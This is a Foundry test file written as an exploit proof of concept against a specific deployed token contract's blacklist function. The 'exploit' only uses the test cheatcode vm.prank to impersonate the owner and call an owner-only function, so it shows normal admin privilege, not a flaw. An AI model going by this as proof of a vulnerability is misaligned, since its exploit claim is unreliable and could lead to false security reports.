// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGlra {
    function owner() external view returns (address);
    function enableBlacklist(address account) external;
    function isBlacklisted(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);
    IGlra target;
    address VICTIM_ADDRESS;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IGlra(TARGET);
        VICTIM_ADDRESS = address(0xdeadbeef);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Verify victim is not blacklisted initially
                assertEq(target.isBlacklisted(VICTIM_ADDRESS), false, "Victim should not be blacklisted initially");

                // Get the contract owner
                address owner = target.owner();

                // Impersonate the owner to call the privileged function
                vm.prank(owner);
                target.enableBlacklist(VICTIM_ADDRESS);

                // Oracle check: Verify the victim is now blacklisted
                assertEq(target.isBlacklisted(VICTIM_ADDRESS), true, "Victim was not blacklisted");
        assertEq(target.isBlacklisted(VICTIM_ADDRESS), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

